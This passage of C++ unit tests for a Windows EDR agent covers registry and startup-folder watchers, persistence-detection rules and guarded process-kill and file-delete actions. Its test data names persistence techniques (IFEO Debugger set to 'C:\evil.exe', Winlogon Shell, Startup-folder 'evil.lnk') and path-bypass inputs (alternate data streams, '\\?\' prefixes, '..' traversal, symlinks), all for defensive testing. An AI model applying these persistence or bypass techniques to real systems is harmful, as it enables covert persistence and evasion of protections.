        static_cast<DWORD>((profilesRoot.size() + 1) * sizeof(wchar_t))) ==
        ERROR_SUCCESS);
    for (const wchar_t* sid : {L"S-1-5-21-1-2-3-1001",
                               L"S-1-5-21-1-2-3-1002"}) {
        HKEY child = nullptr;
        CHECK(RegCreateKeyExW(root, sid, 0, nullptr, 0, KEY_ALL_ACCESS, nullptr,
                              &child, nullptr) == ERROR_SUCCESS);
        CHECK(RegSetValueExW(child, L"ProfileImagePath", 0, REG_EXPAND_SZ,
            reinterpret_cast<const BYTE*>(profile.c_str()),
            static_cast<DWORD>((profile.size() + 1) * sizeof(wchar_t))) ==
            ERROR_SUCCESS);
        RegCloseKey(child);
    }
    auto discovered = DiscoverProfileStartupDirectories(root);
    CHECK(discovered.size() == 1 && !discovered.front().second);
    auto fallback = DiscoverFallbackStartupDirectories(root);
    CHECK(fallback.size() == 2);
    discovered.insert(discovered.end(), fallback.begin(), fallback.end());
    discovered = CanonicalStartupDirectories(discovered, true);
    CHECK(discovered.size() == 2);
    RegCloseKey(root);
    CHECK(RegDeleteTreeW(HKEY_CURRENT_USER, registryPath.c_str()) == ERROR_SUCCESS);
    RemoveTree(profilesRoot);
}

static void TestRegistrySnapshotOversizedValueContinues() {
    std::wstring subkey = L"Software\\edr-regwatch-test-" +
        std::to_wstring(GetCurrentProcessId());
    HKEY key = nullptr;
    CHECK(RegCreateKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, nullptr, 0,
        KEY_ALL_ACCESS, nullptr, &key, nullptr) == ERROR_SUCCESS);
    std::vector<BYTE> oversized(40 * 1024, 0x41);
    CHECK(RegSetValueExW(key, L"AUnrelated", 0, REG_BINARY,
        oversized.data(), static_cast<DWORD>(oversized.size())) == ERROR_SUCCESS);
    const wchar_t debugger[] = L"C:\\test-owned\\debugger.exe";
    CHECK(RegSetValueExW(key, L"Debugger", 0, REG_SZ,
        reinterpret_cast<const BYTE*>(debugger), sizeof(debugger)) == ERROR_SUCCESS);
    RegistrySnapshot snapshot;
    ReadRegistrySnapshotValues(key, "HKCU\\test", {L"Debugger"}, snapshot);
    CHECK(snapshot["HKCU\\test\\Debugger"] == WideToUtf8(debugger));
    RegCloseKey(key);
    CHECK(RegDeleteTreeW(HKEY_CURRENT_USER, subkey.c_str()) == ERROR_SUCCESS);
}

class CapturingSink final : public ISink {
public:
    void OnEvent(const Event& ev) override {
        std::lock_guard<std::mutex> lock(m_mutex);
        m_events.push_back(ev);
    }
    std::vector<Event> Events() {
        std::lock_guard<std::mutex> lock(m_mutex);
        return m_events;
    }
private:
    std::mutex m_mutex;
    std::vector<Event> m_events;
};

template <typename Pred>
static bool WaitUntil(Pred pred, DWORD timeoutMs) {
    for (DWORD waited = 0; waited < timeoutMs; waited += 25) {
        if (pred()) return true;
        Sleep(25);
    }
    return pred();
}

static void CreateDirs(const std::wstring& path) {
    for (size_t i = 3; i <= path.size(); ++i) {
        if (i == path.size() || path[i] == L'\\')
            CreateDirectoryW(path.substr(0, i).c_str(), nullptr);
    }
}

static void RemoveTree(const std::wstring& dir) {
    std::wstring pattern = dir + L"\\*";
    WIN32_FIND_DATAW data = {};
    HANDLE find = FindFirstFileW(pattern.c_str(), &data);
    if (find != INVALID_HANDLE_VALUE) {
        do {
            if (wcscmp(data.cFileName, L".") == 0 ||
                wcscmp(data.cFileName, L"..") == 0)
                continue;
            std::wstring child = dir + L"\\" + data.cFileName;
            if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                RemoveTree(child);
            else
                DeleteFileW(child.c_str());
        } while (FindNextFileW(find, &data));
        FindClose(find);
    }
    RemoveDirectoryW(dir.c_str());
}

static void WriteTestFile(const std::wstring& path, const char* data) {
    HANDLE file = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (file == INVALID_HANDLE_VALUE) {
        std::wcerr << L"CreateFileW failed for " << path << L": "
                   << GetLastError() << L"\n";
    }
    CHECK(file != INVALID_HANDLE_VALUE);
    DWORD written = 0;
    CHECK(WriteFile(file, data, static_cast<DWORD>(std::strlen(data)),
                    &written, nullptr));
    CloseHandle(file);
}

static void AppendTestFile(const std::wstring& path, const char* data) {
    HANDLE file = CreateFileW(path.c_str(), FILE_APPEND_DATA, 0, nullptr,
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    CHECK(file != INVALID_HANDLE_VALUE);
    DWORD written = 0;
    CHECK(WriteFile(file, data, static_cast<DWORD>(std::strlen(data)),
                    &written, nullptr));
    CloseHandle(file);
}

static void TestStartupWatchCollector() {
    wchar_t temp[MAX_PATH] = {};
    CHECK(GetTempPathW(MAX_PATH, temp) != 0);
    std::wstring root = std::wstring(temp) + L"edr_sw_" +
                        std::to_wstring(GetCurrentProcessId());
    /* The machine-scope path has no AppData\Roaming component; the
     * user-scope path mimics a per-profile startup folder. */
    std::wstring machineDir = root + L"\\machine";
    std::wstring userDir = root + L"\\profile\\AppData\\Roaming\\Microsoft" \
        L"\\Windows\\Start Menu\\Programs\\Startup";
    RemoveTree(root);
    CreateDirs(machineDir);
    CreateDirs(userDir);
    struct Cleanup {
        std::wstring root;
        ~Cleanup() { RemoveTree(root); }
    } cleanup{root};

    CapturingSink sink;
    EventBus bus(64);
    bus.Start(&sink);
    std::vector<std::string> dirs = {WideToUtf8(machineDir.c_str()),
                                     WideToUtf8(userDir.c_str())};
    std::unique_ptr<ICollector> collector(CreateStartupWatchCollector(dirs));
    CHECK(collector->Start(&bus));

    const std::string machineFile =
        WideToUtf8((machineDir + L"\\agent.txt").c_str());
    const std::string userFile =
        WideToUtf8((userDir + L"\\evil.lnk").c_str());
    WriteTestFile(machineDir + L"\\agent.txt", "one");
    WriteTestFile(userDir + L"\\evil.lnk", "two");

    auto findEvent = [&](uint16_t type, const std::string& path,
                         const char* action, const char* scope) {
        for (const Event& ev : sink.Events()) {
            if (ev.type != type) continue;
            auto source = ev.fields.find(field::kSource);
            auto filePath = ev.fields.find(field::kFilePath);
            auto fileAction = ev.fields.find(field::kFileAction);
            auto startupScope = ev.fields.find(field::kStartupScope);
            if (source == ev.fields.end() || filePath == ev.fields.end() ||
                fileAction == ev.fields.end() ||
                startupScope == ev.fields.end())
                continue;
            if (source->second == "startup_folder_watch" &&
                filePath->second == path && fileAction->second == action &&
                startupScope->second == scope)
                return true;
        }
        return false;
    };

    CHECK(WaitUntil([&] {
        return findEvent(EDR_EVT_FILE_CREATE, machineFile, "added", "machine") &&
               findEvent(EDR_EVT_FILE_CREATE, userFile, "added", "user");
    }, 5000));

    AppendTestFile(machineDir + L"\\agent.txt", "-modified");
    CHECK(WaitUntil([&] {
        return findEvent(EDR_EVT_FILE_CREATE, machineFile, "modified", "machine");
    }, 5000));

    CHECK(DeleteFileW((userDir + L"\\evil.lnk").c_str()));
    CHECK(WaitUntil([&] {
        return findEvent(EDR_EVT_FILE_DELETE, userFile, "deleted", "user");
    }, 5000));

    collector->Stop();
    bus.Stop();
}

static void TestPersistenceProductionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });
    auto has = [&](const char* id) {
        return std::find(hits.begin(), hits.end(), id) != hits.end();
    };

    Event taskRegistered;
    taskRegistered.type = EDR_EVT_TASK_SCHEDULER;
    taskRegistered.fields[field::kType] = "TASK_SCHEDULER";
    taskRegistered.fields[field::kOperationType] = "TASK_REGISTERED";
    taskRegistered.fields[field::kTaskName] = "\\Updater\\evil";
    engine.OnEvent(taskRegistered);
    CHECK(has("EDR-032") && !has("EDR-033") && !has("EDR-034"));

    hits.clear();
    Event taskUpdated = taskRegistered;
    taskUpdated.fields[field::kOperationType] = "TASK_UPDATED";
    engine.OnEvent(taskUpdated);
    CHECK(has("EDR-033") && !has("EDR-032"));

    hits.clear();
    Event taskDeleted = taskRegistered;
    taskDeleted.fields[field::kOperationType] = "TASK_DELETED";
    engine.OnEvent(taskDeleted);
    CHECK(has("EDR-034") && !has("EDR-032"));

    hits.clear();
    Event msTask = taskRegistered;
    msTask.fields[field::kTaskName] =
        "\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Work";
    engine.OnEvent(msTask);
    CHECK(!has("EDR-032") && !has("EDR-033") && !has("EDR-034"));

    hits.clear();
    Event startupText;
    startupText.type = EDR_EVT_FILE_CREATE;
    startupText.fields[field::kType] = "FILE_CREATE";
    startupText.fields[field::kSource] = "startup_folder_watch";
    startupText.fields[field::kFilePath] =
        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\notes.txt";
    startupText.fields[field::kFileAction] = "added";
    startupText.fields[field::kStartupScope] = "machine";
    engine.OnEvent(startupText);
    CHECK(has("EDR-035") && !has("EDR-036"));

    hits.clear();
    Event startupLnk = startupText;
    startupLnk.fields[field::kFilePath] =
        "C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.lnk";
    startupLnk.fields[field::kStartupScope] = "user";
    engine.OnEvent(startupLnk);
    CHECK(has("EDR-035") && has("EDR-036"));

    hits.clear();
    Event deletedStartup = startupLnk;
    deletedStartup.type = EDR_EVT_FILE_DELETE;
    deletedStartup.fields[field::kType] = "FILE_DELETE";
    deletedStartup.fields[field::kFileAction] = "deleted";
    engine.OnEvent(deletedStartup);
    CHECK(has("EDR-069") && has("EDR-070"));

    hits.clear();
    Event deletedText = deletedStartup;
    deletedText.fields[field::kFilePath] =
        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\notes.txt";
    engine.OnEvent(deletedText);
    CHECK(has("EDR-069") && !has("EDR-070"));

    hits.clear();
    Event nonStartup = startupText;
    nonStartup.fields[field::kSource] = "file_fallback";
    engine.OnEvent(nonStartup);
    CHECK(!has("EDR-035") && !has("EDR-036"));

    hits.clear();
    Event ifeo;
    ifeo.type = EDR_EVT_REG_WRITE;
    ifeo.fields[field::kType] = "REG_WRITE";
    ifeo.fields[field::kSource] = "registry_watch";
    ifeo.fields[field::kRegKey] =
        "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\\Debugger";
    ifeo.fields[field::kRegValue] = "C:\\evil.exe";
    engine.OnEvent(ifeo);
    CHECK(has("EDR-037"));

    hits.clear();
    Event ifeoOther = ifeo;
    ifeoOther.fields[field::kRegKey] =
        "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\foo.exe\\GlobalFlag";
    engine.OnEvent(ifeoOther);
    CHECK(!has("EDR-037"));

    hits.clear();
    Event winlogon = ifeo;
    winlogon.fields[field::kRegKey] =
        "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell";
    engine.OnEvent(winlogon);
    CHECK(has("EDR-038"));

    hits.clear();
    Event winlogonOther = ifeo;
    winlogonOther.fields[field::kRegKey] =
        "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AutoAdminLogon";
    engine.OnEvent(winlogonOther);
    CHECK(!has("EDR-038"));
}

class FakeResponsePlatform final : public IResponseActionPlatform {
public:
    enum class Failure { None, Open, Image, FileIdentity, Critical, Protection,
                         Session, Token, CreateFirst, CreateSecond, Terminate, Wait };
    Failure failure = Failure::None;
    bool critical = false;
    bool protectedProcess = false;
    bool sameImage = false;
    bool systemSid = false;
    bool sessionZero = false;
    bool terminateCalled = false;
    int createCalls = 0;
    DWORD waitResult = WAIT_OBJECT_0;

    /* Process-tree simulation. */
    std::vector<uint32_t> children; /* children of the root (pid 100) */
    bool enumerateFail = false;
    bool suspendFail = false;
    bool resumeFail = false;
    int suspendCalls = 0;
    int resumeCalls = 0;
    int terminateCalls = 0;
    int failChildTerminates = 0; /* first N Terminate calls fail (root last) */
    std::wstring childBase = L"child.exe"; /* image base for tree children */
    bool childIdentitySelf = false; /* children equal the agent identity */
    int imageCalls = 0;
    int fileIdentityCalls = 0;
    bool mutateDeleteIdentity = false;
    bool replaceChildPidAfterEnumeration = false;
    bool childPidReplaced = false;
    std::vector<uint32_t> terminatedPids;
    std::vector<uint32_t> suspendedPids;
    std::vector<uint32_t> resumedPids;
    std::unordered_set<HANDLE> deleteFileHandles;
    std::unordered_map<HANDLE, std::wstring> deleteFilePaths;
    bool replaceDeletePathAfterFinalIdentityCheck = false;
    bool deletePathReplaced = false;
    std::wstring deleteOriginalBackup;
    /* Per-child policy overrides, keyed by pid. Open() returns the pid as the
     * handle and records it here so Critical/Protected/UserSid can tell the
     * root (pid 100, always the global bools) from tree children. */
    std::unordered_map<HANDLE, uint32_t> handlePid;
    std::unordered_set<uint32_t> childCritical;
    std::unordered_set<uint32_t> childProtected;
    std::unordered_set<uint32_t> childSessionZero;
    std::unordered_set<uint32_t> childSystemSid;
    uint32_t failChildCritical = 0; /* child pid whose Critical() call fails */

    uint32_t PidOf(HANDLE process) const {
        auto it = handlePid.find(process);
        return it == handlePid.end() ? 100 : it->second;
    }

    bool Open(uint32_t pid, HANDLE& process, DWORD& error) override {
        if (failure == Failure::Open) { error = 5; return false; }
        process = reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(pid));
        handlePid[process] = pid;
        return true;
    }
    void Close(HANDLE handle) override {
        if (deleteFileHandles.erase(handle) != 0) {
            deleteFilePaths.erase(handle);
            CloseHandle(handle);
        }
    }
    bool Image(HANDLE process, std::wstring& path, std::wstring& base,
               DWORD& error) override {
        if (failure == Failure::Image) { error = 2; return false; }
        auto it = handlePid.find(process);
        if (it == handlePid.end()) { /* not opened via Open(): agent self */
            path = L"C:\\test\\agent.exe";
            base = L"agent.exe";
            return true;
        }
        ++imageCalls;
        if (it->second == 100) {
            path = L"C:\\test\\child.exe";
            base = L"child.exe";
        } else {
            path = L"C:\\test\\" + childBase;
            base = childBase;
        }
        return true;
    }
    bool FileIdentity(const std::wstring& path, ResponseFileIdentity& id,
                      DWORD& error) override {
        if (failure == Failure::FileIdentity) { error = 2; return false; }
        ++fileIdentityCalls;
        id.volumeSerial = 7;
        bool root = path == L"C:\\test\\child.exe";
        bool child = !root && path == L"C:\\test\\" + childBase;
        id.fileId[0] =
            (sameImage || (!root && !child) || (child && childIdentitySelf)) ? 2 : 1;
        if (replaceDeletePathAfterFinalIdentityCheck &&
            path.find(L"edr-response-delete-handle-race") != std::wstring::npos)
            id.fileId[0] = 1;
        if (mutateDeleteIdentity && path.find(L"edr-response-delete") != std::wstring::npos &&
            fileIdentityCalls >= 3) {
            id.fileId[0] = 9;
        }
        if (replaceDeletePathAfterFinalIdentityCheck && !deletePathReplaced &&
            path.find(L"edr-response-delete-handle-race") != std::wstring::npos &&
            fileIdentityCalls >= 3) {
            /* Return the verified original identity, then replace the path
             * before the caller's next operation. A path delete would now
             * remove the replacement, while a retained handle still names
             * the original file object. */
            id.fileId[0] = 1;
            deleteOriginalBackup = path + L".identity-original";
            DeleteFileW(deleteOriginalBackup.c_str());
            if (!MoveFileExW(path.c_str(), deleteOriginalBackup.c_str(),
                             MOVEFILE_REPLACE_EXISTING)) {
                error = GetLastError();
                return false;
            }
            HANDLE replacement = CreateFileW(path.c_str(), GENERIC_WRITE, 0,
                nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (replacement == INVALID_HANDLE_VALUE) {
                error = GetLastError();
                return false;
            }
            const char marker[] = "replacement";
            DWORD written = 0;
            const BOOL wrote = WriteFile(replacement, marker,
                static_cast<DWORD>(sizeof(marker)), &written, nullptr);
            CloseHandle(replacement);
            if (!wrote || written != sizeof(marker)) {
                error = ERROR_WRITE_FAULT;
                return false;
            }
            deletePathReplaced = true;
        }
        return true;
    }
    bool Critical(HANDLE process, bool& value, DWORD& error) override {
        uint32_t pid = PidOf(process);
        if (failure == Failure::Critical ||
            (failChildCritical != 0 && pid == failChildCritical)) {
            error = 5; return false;
        }
        value = critical || childCritical.count(pid) != 0; return true;
    }
    bool Protected(HANDLE process, bool& value, DWORD& error) override {
        if (failure == Failure::Protection) { error = 5; return false; }
        value = protectedProcess || childProtected.count(PidOf(process)) != 0;
        return true;
    }
    bool Session(uint32_t pid, DWORD& value, DWORD& error) override {
        if (failure == Failure::Session) { error = 5; return false; }
        value = (sessionZero || childSessionZero.count(pid) != 0) ? 0 : 1;
        return true;
    }
    bool UserSid(HANDLE process, std::wstring& value, DWORD& error) override {
        if (failure == Failure::Token) { error = 5; return false; }
        value = (systemSid || childSystemSid.count(PidOf(process)) != 0)
            ? L"S-1-5-18" : L"S-1-5-21-1";
        return true;
    }
    bool CreateTime(HANDLE process, uint64_t& value, DWORD& error) override {
        ++createCalls;
        if ((failure == Failure::CreateFirst && createCalls == 1) ||
            (failure == Failure::CreateSecond && createCalls == 2)) {
            error = 5; return false;
        }
        value = (failure == Failure::CreateSecond && createCalls == 2) ? 124
              : (childPidReplaced && PidOf(process) != 100 ? 124 : 123);
        return true;
    }
    bool Terminate(HANDLE process, DWORD& error) override {
        terminateCalled = true;
        ++terminateCalls;
        terminatedPids.push_back(PidOf(process));
        if (terminateCalls <= failChildTerminates) { error = 5; return false; }
        if (failure == Failure::Terminate) { error = 5; return false; }
        return true;
    }
    DWORD Wait(HANDLE, DWORD, DWORD& error) override {
        if (failure == Failure::Wait) { error = 6; return WAIT_FAILED; }
        return waitResult;
    }
    bool EnumerateChildren(uint32_t parentPid,
                           std::vector<uint32_t>& childPids,
                           DWORD& error) override {
        if (enumerateFail) { error = 5; return false; }
        childPids = (parentPid == 100) ? children : std::vector<uint32_t>{};
        return true;
    }
    bool EnumerateChildren(const ResponseProcessIdentity& parent,
                           std::vector<ResponseProcessIdentity>& childIdentities,
                           DWORD& error) override {
        std::vector<uint32_t> childPids;
        if (!EnumerateChildren(parent.pid, childPids, error)) return false;
        childIdentities.clear();
        for (uint32_t pid : childPids) {
            ResponseProcessIdentity child;
            child.pid = pid;
            child.createTime100ns = 123;
            child.parentPid = parent.pid;
            child.parentCreateTime100ns = parent.createTime100ns;
            childIdentities.push_back(child);
        }
        if (replaceChildPidAfterEnumeration && parent.pid == 100)
            childPidReplaced = true;
        return true;
    }
    bool Suspend(HANDLE process, uint64_t expectedCreateTime100ns,
                 DWORD& error) override {
        ++suspendCalls;
        suspendedPids.push_back(PidOf(process));
        if (expectedCreateTime100ns != 123 ||
            (childPidReplaced && PidOf(process) != 100)) {
            error = ERROR_INVALID_PARAMETER;
            return false;
        }
        if (suspendFail) { error = 5; return false; }
        return true;
    }
    bool Resume(HANDLE process, uint64_t expectedCreateTime100ns,
                DWORD& error) override {
        ++resumeCalls;
        resumedPids.push_back(PidOf(process));
        if (expectedCreateTime100ns != 123) {
            error = ERROR_INVALID_PARAMETER;
            return false;
        }
        if (resumeFail) { error = 5; return false; }
        return true;
    }
    bool OpenFileForDelete(const std::wstring& path, HANDLE& file,
                           ResponseFileIdentity& identity,
                           DWORD& error) override {
        file = CreateFileW(path.c_str(), DELETE | FILE_READ_ATTRIBUTES,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (file == INVALID_HANDLE_VALUE) {
            file = nullptr;
            error = GetLastError();
            return false;
        }
        if (!FileIdentity(path, identity, error)) {
            CloseHandle(file);
            file = nullptr;
            return false;
        }
        deleteFileHandles.insert(file);
        deleteFilePaths[file] = path;
        return true;
    }
    bool DeleteFileHandle(HANDLE file, DWORD& error) override {
        FILE_DISPOSITION_INFO disposition = {};
        disposition.DeleteFile = TRUE;
        if (!SetFileInformationByHandle(file, FileDispositionInfo, &disposition,
                                        sizeof(disposition))) {
            error = GetLastError();
            return false;
        }
        return true;
    }
    bool IsAlive(uint32_t, DWORD& error) override {
        return true;
    }
};

class FakeResponseAudit final : public IResponseActionAudit {
public:
    bool failAttempt = false;
    bool failOutcome = false;
    bool failAttemptDeleteFile = false;
    bool failOutcomeDeleteFile = false;
    int attempts = 0;
    int outcomes = 0;
    int attemptDeleteFiles = 0;
    int outcomeDeleteFiles = 0;
    bool Attempt(const ResponseActionRequest&, std::string& error) override {
        ++attempts;
        if (failAttempt) { error = "write failed"; return false; }
        return true;
    }
    bool Outcome(const ResponseActionResult&, std::string& error) override {
        ++outcomes;
        if (failOutcome) { error = "write failed"; return false; }
        return true;
    }
    bool AttemptDeleteFile(const DeleteFileRequest&, std::string& error) override {
        ++attemptDeleteFiles;
        if (failAttemptDeleteFile) { error = "write failed"; return false; }
        return true;
    }
    bool OutcomeDeleteFile(const DeleteFileResult&, std::string& error) override {
        ++outcomeDeleteFiles;
        if (failOutcomeDeleteFile) { error = "write failed"; return false; }
        return true;
    }
};

class FakeEmergencySink final : public IResponseEmergencySink {
public:
    int calls = 0;
    void AuditFailure(const ResponseActionResult&, const std::string&) override {
        ++calls;
    }
};

static ResponseActionRequest TestActionRequest(DWORD pid = 100) {
    ResponseActionRequest request;
    request.requestId = "aaaaaaaa-1234-1234-1234-123456789abc";
    request.timestamp = std::to_string(CurrentFileTime());
    request.reason = "native policy test";
    request.pid = pid;
    request.createTime100ns = 123;
    return request;
}

static ResponseActionResult ExecuteFake(FakeResponsePlatform& platform,
                                        FakeResponseAudit& audit,
                                        FakeEmergencySink& emergency,
                                        DWORD pid = 100) {
    ResponseActionExecutor executor(platform, audit, emergency, 1);
    return executor.Execute(TestActionRequest(pid));
}

static void TestResponseActionPolicySeams() {
    for (DWORD pid : {0UL, 4UL, GetCurrentProcessId()}) {
        FakeResponsePlatform platform; FakeResponseAudit audit; FakeEmergencySink emergency;
        CHECK(ExecuteFake(platform, audit, emergency, pid).status == "policy_rejected");
        CHECK(audit.attempts == 0 && !platform.terminateCalled);
    }
    for (auto failure : {FakeResponsePlatform::Failure::Image,
                         FakeResponsePlatform::Failure::FileIdentity,
                         FakeResponsePlatform::Failure::Critical,
                         FakeResponsePlatform::Failure::Protection,
                         FakeResponsePlatform::Failure::Session,
                         FakeResponsePlatform::Failure::Token}) {
        FakeResponsePlatform platform; FakeResponseAudit audit; FakeEmergencySink emergency;
        platform.failure = failure;
        CHECK(ExecuteFake(platform, audit, emergency).status != "terminated");
        CHECK(audit.attempts == 0 && !platform.terminateCalled);
    }
    for (int policy = 0; policy < 5; ++policy) {
        FakeResponsePlatform platform; FakeResponseAudit audit; FakeEmergencySink emergency;
        if (policy == 0) platform.sameImage = true;
        if (policy == 1) platform.critical = true;
        if (policy == 2) platform.protectedProcess = true;
        if (policy == 3) platform.sessionZero = true;
        if (policy == 4) platform.systemSid = true;
        CHECK(ExecuteFake(platform, audit, emergency).status == "policy_rejected");
        CHECK(audit.attempts == 0 && !platform.terminateCalled);
    }
}

static void TestResponseActionAuditAndOutcomeSeams() {
    FakeResponsePlatform platform; FakeResponseAudit audit; FakeEmergencySink emergency;
    audit.failAttempt = true;
    ResponseActionResult result = ExecuteFake(platform, audit, emergency);
    CHECK(result.status == "audit_failed" && !platform.terminateCalled);

    platform = FakeResponsePlatform(); audit = FakeResponseAudit();
    platform.waitResult = WAIT_TIMEOUT;
    result = ExecuteFake(platform, audit, emergency);
    CHECK(result.status == "termination_pending");
    CHECK(result.terminationRequested && !result.exitObserved);
    CHECK(audit.attempts == 1 && audit.outcomes == 1);

    platform = FakeResponsePlatform(); audit = FakeResponseAudit();
    audit.failOutcome = true;
    result = ExecuteFake(platform, audit, emergency);
    CHECK(result.status == "terminated" && result.terminationRequested && result.exitObserved);
    CHECK(!result.auditWritten && emergency.calls == 1);

    platform = FakeResponsePlatform(); audit = FakeResponseAudit();
    platform.failure = FakeResponsePlatform::Failure::CreateSecond;
    result = ExecuteFake(platform, audit, emergency);
    CHECK(result.status == "identity_changed" && !platform.terminateCalled);
    CHECK(audit.attempts == 1 && audit.outcomes == 1);
}

static void TestResponseDeleteFilePathPolicy() {
    const std::vector<std::wstring> movedRoots = {
        L"D:\\WinRoot", L"D:\\Apps", L"D:\\ProgramData"};
    CHECK(IsProtectedResponsePathForRoots(L"D:\\WinRoot\\System32\\cmd.exe", movedRoots));
    CHECK(IsProtectedResponsePathForRoots(L"d:\\apps\\Vendor\\agent.exe", movedRoots));
    CHECK(IsProtectedResponsePathForRoots(L"D:\\ProgramData\\service.dat", movedRoots));
    CHECK(!IsProtectedResponsePathForRoots(L"D:\\WinRooted\\sample.exe", movedRoots));
    CHECK(!IsProtectedResponsePathForRoots(L"C:\\Windows\\sample.exe", movedRoots));
    CHECK(IsProtectedResponsePathForRoots(L"D:\\Other\\..\\WinRoot\\cmd.exe", movedRoots));
    CHECK(IsProtectedResponsePathForRoots(L"D:\\Other\\cmd.exe", {}));
    CHECK(IsProtectedResponsePathForRoots(L"D:\\Other\\cmd.exe", {L"D:WinRoot"}));

    wchar_t temp[MAX_PATH] = {};
    CHECK(GetTempPathW(MAX_PATH, temp) > 0);
    const std::wstring path = std::wstring(temp) + L"edr-response-delete-policy-" +
        std::to_wstring(GetCurrentProcessId()) + L".txt";
    HANDLE file = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    CHECK(file != INVALID_HANDLE_VALUE);
    CloseHandle(file);

    FakeResponsePlatform platform;
    FakeResponseAudit audit;
    FakeEmergencySink emergency;
    ResponseFileIdentity selfIdentity;
    selfIdentity.volumeSerial = 99;
    selfIdentity.fileId[0] = 99;
    ResponseActionExecutor executor(platform, audit, emergency, 1,
                                     &selfIdentity);
    DeleteFileRequest request;
    request.requestId = "dddddddd-1234-1234-1234-123456789abc";
    request.timestamp = std::to_string(CurrentFileTime());
    request.reason = "delete path policy regression";
    request.path = WideToUtf8(path.c_str());

    const std::string original = request.path;
    for (const std::string& candidate : {
             original + ":alternate",
             original.substr(0, original.find_last_of('\\')) +
                 "\\.\\" + original.substr(original.find_last_of('\\') + 1),
             std::string("\\\\?\\") + original,
         }) {
        request.path = candidate;
        DeleteFileResult result = executor.ExecuteDeleteFile(request);
        CHECK(result.status == "policy_rejected");
        CHECK(audit.attemptDeleteFiles == 0);
        CHECK(GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES);
    }

    /* C:\\Users\\..\\Windows bypassed a prefix-only protected-path check. */
    wchar_t windows[MAX_PATH] = {};
    CHECK(GetWindowsDirectoryW(windows, MAX_PATH) > 0);
    request.path = WideToUtf8((std::wstring(windows) + L"\\System32\\cmd.exe").c_str());
    CHECK(executor.ExecuteDeleteFile(request).status == "policy_rejected");
    CHECK(audit.attemptDeleteFiles == 0);
    request.path = WideToUtf8(windows);
    request.path.insert(3, "Users\\..\\");
    request.path += "\\System32\\cmd.exe";
    CHECK(executor.ExecuteDeleteFile(request).status == "policy_rejected");
    CHECK(audit.attemptDeleteFiles == 0);

    const std::wstring link = std::wstring(temp) + L"edr-response-delete-link-" +
        std::to_wstring(GetCurrentProcessId());
    if (CreateSymbolicLinkW(link.c_str(), temp,
                            SYMBOLIC_LINK_FLAG_DIRECTORY |
                            SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE)) {
        request.path = WideToUtf8((link + L"\\" +
            path.substr(path.find_last_of(L'\\') + 1)).c_str());
        CHECK(executor.ExecuteDeleteFile(request).status == "policy_rejected");
        CHECK(audit.attemptDeleteFiles == 0);
        CHECK(GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES);
        CHECK(RemoveDirectoryW(link.c_str()));
    }

    request.path = original;
    DeleteFileResult result = executor.ExecuteDeleteFile(request);
    CHECK(result.status == "deleted" && result.deleted);
    CHECK(audit.attemptDeleteFiles == 1 && audit.outcomeDeleteFiles == 1);
    CHECK(GetFileAttributesW(path.c_str()) == INVALID_FILE_ATTRIBUTES);
    request.requestId = "eeeeeeee-1234-1234-1234-123456789abc";
    result = executor.ExecuteDeleteFile(request);
    CHECK(result.status == "already_gone" && result.deleted);
    CHECK(audit.attemptDeleteFiles == 2 && audit.outcomeDeleteFiles == 2);
}

static void TestResponseDeleteFileIdentityBinding() {
    wchar_t temp[MAX_PATH] = {};
    CHECK(GetTempPathW(MAX_PATH, temp) > 0);

    /* Embedded callers that do not precompute the agent identity still get a
     * self-delete guard. */
    const std::wstring selfPath = std::wstring(temp) +
        L"edr-response-delete-self-" + std::to_wstring(GetCurrentProcessId()) +
        L".txt";
    HANDLE selfFile = CreateFileW(selfPath.c_str(), GENERIC_WRITE, 0, nullptr,
                                  CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    CHECK(selfFile != INVALID_HANDLE_VALUE);
    CloseHandle(selfFile);
    {
        FakeResponsePlatform platform;
        FakeResponseAudit audit;
        FakeEmergencySink emergency;
        ResponseActionExecutor executor(platform, audit, emergency, 1);
        DeleteFileRequest request;
        request.requestId = "ffffffff-1234-1234-1234-123456789abc";
        request.timestamp = std::to_string(CurrentFileTime());
        request.reason = "self delete guard";
        request.path = WideToUtf8(selfPath.c_str());
        DeleteFileResult result = executor.ExecuteDeleteFile(request);
        CHECK(result.status == "policy_rejected");
        CHECK(audit.attemptDeleteFiles == 0);
        CHECK(GetFileAttributesW(selfPath.c_str()) != INVALID_FILE_ATTRIBUTES);
    }
    CHECK(DeleteFileW(selfPath.c_str()));

    /* A replacement between the audited attempt and DeleteFileW is rejected
     * by the second file-identity check. */
    const std::wstring replacementPath = std::wstring(temp) +
        L"edr-response-delete-identity-" +
        std::to_wstring(GetCurrentProcessId()) + L".txt";
    HANDLE replacementFile = CreateFileW(replacementPath.c_str(), GENERIC_WRITE,
                                         0, nullptr, CREATE_ALWAYS,
